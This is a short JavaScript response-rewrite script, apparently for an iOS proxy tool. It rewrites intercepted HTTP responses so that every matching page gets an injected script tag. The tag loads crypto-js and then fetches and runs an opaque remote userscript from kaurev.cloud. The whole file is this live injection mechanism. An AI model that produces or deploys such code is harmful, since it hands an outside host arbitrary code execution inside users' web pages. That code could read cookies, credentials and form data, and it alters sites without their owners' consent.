let body = $response.body;

let inject = `
<script>
(function(){
  console.log("Inject aktif ✅");

  var s1 = document.createElement('script');
  s1.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
  s1.onload = function() {

    var s2 = document.createElement('script');
    s2.src = "https://kaurev.cloud/7619565898/7b5a932293ffe702d15cf43d74be307f5502272c1895b917e5a71434ce3215cf/install.user.js";

    document.body.appendChild(s2);
  };

  document.head.appendChild(s1);
})();
</script>
`;

body = body.replace("</body>", inject + "</body>");

$done({ body });
